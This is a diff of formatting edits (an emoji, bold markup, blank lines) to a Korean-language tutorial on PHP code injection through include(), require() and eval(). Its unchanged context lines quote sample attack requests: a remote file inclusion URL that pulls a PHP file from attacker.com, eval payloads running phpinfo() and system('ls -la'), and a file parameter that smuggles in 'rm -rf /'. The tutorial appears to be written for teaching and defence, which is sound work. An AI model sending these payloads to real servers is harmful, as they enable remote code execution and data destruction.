@@ -1,8 +1,8 @@
-## **코드 인젝션 (Code Injection) 취약점**
+## 🔥 **코드 인젝션 (Code Injection) 취약점**
 
 **코드 인젝션(Code Injection)** 취약점은 공격자가 악성 코드를 서버의 실행 과정에 삽입하여 실행하도록 만드는 공격입니다. PHP에서는 **`include()`, `include_once()`, `require()`, `require_once()`, `eval()`** 함수들을 자주 사용하게 되는데, 이 함수들이 제대로 검증되지 않은 외부 입력을 처리할 경우 공격자가 악성 코드를 삽입하고 실행시킬 수 있습니다.
 
-#### **1. include(), require() 함수 취약점**
+#### 1. include(), require() 함수 취약점
 
 `include()`나 `require()`는 외부 PHP 파일을 포함시킬 때 사용되는 함수입니다. 이 함수들은 웹 입력을 통해 동적으로 포함되는 파일 경로를 받아 처리하는데, 사용자가 입력한 데이터를 검증 없이 파일 경로로 사용하면 **파일 포함 공격**(File Inclusion Attack)에 취약해질 수 있습니다.
 
@@ -21,8 +21,10 @@
 
 * **상위 디렉터리 탐색 공격**: `../`를 이용하여 다른 디렉터리로 이동할 수 있습니다. 이를 통해 서버의 민감한 파일을 포함시킬 수 있습니다.
 * **원격 파일 포함 (RFI)**: 만약 서버에서 `allow_url_include` 설정이 켜져 있으면, 공격자는 원격 서버에 있는 악성 PHP 파일을 포함시킬 수 있습니다.
+* 
 <br>
-#### **2. eval() 함수 취약점**
+
+#### 2. eval() 함수 취약점
 
 `eval()` 함수는 PHP 코드를 **문자열로** 실행하는 함수입니다. 이 함수에 사용자 입력이 들어가면 공격자가 **PHP 코드를 실행**시킬 수 있습니다.
 
@@ -58,6 +60,7 @@ http://example.com/vulnerable.php?id=http://attacker.com/malicious.php
 ```
 
 위의 URL은 `attacker.com`에 위치한 악성 PHP 파일을 포함시키려는 공격입니다. 이 파일은 서버에서 실행되어 **악성 코드**를 삽입할 수 있습니다.
+
 <br>
 
 #### 2. eval() 함수 취약점 공격
@@ -71,6 +74,7 @@ http://example.com/vulnerable.php?code=phpinfo();
 ```
 
 위의 URL은 `phpinfo()` 함수를 실행하여 서버의 **환경 정보**를 출력하는 PHP 코드를 실행시키는 공격입니다. 이 정보를 통해 공격자는 서버에 대한 중요한 정보를 얻을 수 있습니다.
+
 <br>
 
 #### 3. 악성 코드 삽입
@@ -88,6 +92,7 @@ http://example.com/vulnerable.php?code=system('ls -la'); // 서버 명령어 실
 ```
 GET /api.php?file=example.txt;rm%20-rf%20/
 ```
+
 <br>
 
 #### 4. 요청의 바디(POST body)를 PHP 인터프리터가 자동으로 포함
